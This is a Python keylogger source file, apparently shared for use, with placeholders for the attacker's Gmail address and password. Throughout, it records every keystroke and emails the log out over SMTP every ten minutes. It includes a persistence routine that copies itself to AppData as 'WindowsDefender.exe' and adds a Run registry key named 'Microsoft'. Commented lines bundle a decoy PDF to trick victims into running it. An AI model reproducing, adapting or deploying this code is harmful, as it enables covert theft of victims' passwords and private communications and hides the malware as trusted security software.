#!/usr/bin/env python

'''
Follow On Twitter --> Killer007p
'''

import pynput.keyboard as keyboard
import threading
import smtplib,sys,subprocess,os,shutil

class Keylogger:

    def __init__(self, time_inter, email,passw):
 
    	self.interval = time_inter				
    	self.email = email
    	self.password = passw
    	self.log = "Keylogger Started"			
    	# self.persistance()					#uncomment this if you want it pesistant

    def process_key_press(self, key):
        try:
            self.log = self.log + str(key.char)      

        except AttributeError:
            if key == key.space:                     
                self.log = self.log + " "
            else:
                self.log = self.log + " " + str(key) + " "     

    def send_mail(self, email, passw, msg):
        server = smtplib.SMTP("smtp.gmail.com", 587)
        server.starttls()                                       #Make Sure to allow low-security apps in gmail.account {Otherwise it doesnt allow login}
        server.login(email, passw)
        server.sendmail(email, email, msg)
        server.quit()

    def report(self):
        self.send_mail(self.email,self.password, "\n\n" + self.log)         
        self.log = " "                                                      
        timer = threading.Timer(self.interval, self.report)                 
        timer.start()

    def start(self):        
        keyboard_listener = keyboard.Listener(on_press=self.process_key_press)   
        with keyboard_listener:                                                  
            self.report()                                                        
            keyboard_listener.join()

    def persistance(self):
    	evil_file_location = os.environ["appdata"] + "\\WindowsDefender.exe"			
    	if not os.path.exists(evil_file_location):										
    		shutil.copyfile(sys.executable,evil_file_location)							
    		subprocess.call('reg add HKCU\Software\Microsoft\Windows\Currentversion\Run /v Microsoft /t REG_SZ /d "' + evil_file_location + '"', shell=True)
    																				
#UNCOMMENT 2 LINES IF ATTACHING WITH A FILE
#file_name = sys._MEIPASS + "\\YourFile.pdf"					
#subprocess.Popen(file_name,shell=True)							

GmailID ="Youremail"
Password = "yourpass"
Interval = 600								#CHANGE MAIL,PASS & Interval bw each mail   [600/60 = 10 minutes]
my_keylog = Keylogger(Interval, GmailID, Password)              
my_keylog.start()


#Make sure to enable insecure apps in gmail
#The File will be first time opened as the name of the original File but after it restarts it will be shown in taskManager as WindowsDefender.exe